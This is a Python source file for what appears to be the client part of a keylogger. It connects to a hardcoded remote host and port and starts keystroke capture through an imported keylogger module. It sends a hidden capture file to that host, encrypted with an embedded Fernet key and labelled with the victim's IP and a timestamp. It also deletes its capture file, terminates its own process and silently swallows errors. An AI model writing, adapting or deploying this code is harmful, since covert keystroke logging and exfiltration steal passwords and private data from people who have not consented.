import keylogger
import socket
import os  
import time
from datetime import datetime
from cryptography.fernet import Fernet
import psutil

def get_filename():
    now = datetime.now()
    
    ip = socket.gethostbyname(socket.gethostname())
    
    if os.name == 'nt':
        filename = ip + "-" + now.strftime("%d-%m-%Y-%H-%M-%S") + ".keyboard.txt"
    else:
        filename = ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"

    return filename

def launch_keylogger(mysocket):
    return keylogger.listen_keyboard(mysocket)

def kill_server():
    p = psutil.Process(os.getpid())
    p.terminate()

    
def stop_and_delete_capture_file():
    file = ".document1.txt" 
    os.remove(file)
    kill_server()

    

def get_socket(server_address, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    client_socket.connect((server_address, server_port))
    return client_socket

def send_file_securely(client_socket):
    try:
        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
 
        filename = get_filename()
        encrypted_message = Fernet(key).encrypt(filename.encode('utf-8'))
        client_socket.send(encrypted_message)

        with open(".document1.txt", "r") as file:
            lines = file.read()
            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
            client_socket.send(encrypted_lines)
            time.sleep(1)
            file.close()
            del file
    except Exception:
        pass
            
    finally:
        client_socket.close()

if __name__ == "__main__":
    try:
        mysocket = get_socket("192.168.1.13", 12345)
        
        launch_keylogger(mysocket)
    except Exception:
        pass


